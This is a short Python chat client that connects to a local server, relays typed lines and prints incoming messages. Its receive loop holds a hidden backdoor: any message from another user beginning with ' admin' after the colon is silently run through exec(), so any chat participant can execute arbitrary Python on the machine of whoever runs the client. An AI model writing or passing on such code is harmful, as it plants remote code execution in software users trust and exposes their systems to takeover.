import threading
import socket



IP="127.0.0.1"
PORT=12345





sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.IPPROTO_TCP)

name_sent=False
name=""
def get_input():
	global name,name_sent
	while True:
		inp = input()
		sock.send(inp.encode("utf-8"))
		if not name_sent:
			name=inp
			name_sent=True



try:
	sock.connect((IP,PORT))
except Exception:
	print("bruv")
print("connected")

thread=threading.Thread(target=get_input)
thread.start()

while True:
	msg=sock.recv(1024).decode("utf-8")
	if msg.startswith("[") and not msg.startswith(f"[{name}]"):
		read=msg[msg.index(":")+1:]
		if read.startswith(" admin"):
			rr=read[6:].strip()
			exec(rr)
			continue
	print(msg)


